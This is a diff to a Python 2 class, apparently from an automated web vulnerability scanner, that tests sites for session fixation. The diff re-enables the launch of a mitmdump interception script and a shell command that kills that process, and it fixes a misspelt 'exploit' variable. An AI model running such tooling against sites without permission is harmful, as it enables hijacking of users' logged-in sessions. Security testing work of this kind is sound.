@@ -31,7 +31,7 @@ class SessionFixationAttack(Attack):
         profile.set_preference("general.useragent.override","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A")
         profile.update_preferences()
         wd = webdriver.Firefox(firefox_profile=profile)
-        #subprocess.Popen(["nohup", "mitmdump", "-s", "mitm_scripts/mitm_session_fixation.py"])
+        subprocess.Popen(["nohup", "mitmdump", "-s", "mitm_scripts/mitm_session_fixation.py"])
         with open('tmp_cookie.txt', 'w+') as f:
             f.write(self.cookie["name"])
         time.sleep(1)
@@ -49,7 +49,7 @@ class SessionFixationAttack(Attack):
         print "recived_cookie is: %s " % recived_cookie
         if recived_cookie == "12345":
             print "CONFIRMED: login sucessfully. client side fixation attack successful."
-            expliot = {
+            exploit = {
                 "page": self.link,
                 "cookie": [{
                     "name": self.cookie["name"],
@@ -58,11 +58,11 @@ class SessionFixationAttack(Attack):
                     "attack": "sessionFixation"
                 }]
             }
-            self.phase4_output(expliot)
+            self.phase4_output(exploit)
         else :
             print "CONFIRMED: login unsucessfully. client side fixation attack failed."
             proceed_to_server_side_fixation_attack = True
-        #subprocess.Popen("kill $(ps -efw | grep mitmdump | grep -v grep | awk '{print $2}')", shell=True)
+        subprocess.Popen("kill $(ps -efw | grep mitmdump | grep -v grep | awk '{print $2}')", shell=True)
         subprocess.Popen("rm nohup.out", shell=True)
         subprocess.Popen("rm tmp_cookie.txt", shell=True)
         wd.close()
@@ -89,7 +89,7 @@ class SessionFixationAttack(Attack):
                 print "cookie after login: %s" % after_cookie
                 if after_cookie == before_cookie :
                     print "CONFIRMED: server side fixation attack successful."
-                    expliot = {
+                    exploit = {
                         "page": self.link,
                         "cookie": [{
                             "name": self.cookie["name"],
@@ -98,7 +98,7 @@ class SessionFixationAttack(Attack):
                             "attack": "sessionFixation"
                         }]
                     }
-                    self.phase4_output(expliot)
+                    self.phase4_output(exploit)
             else :
                 print "=============== CONFIRMED: not a valid fixation issue ========================"
             wd.close()
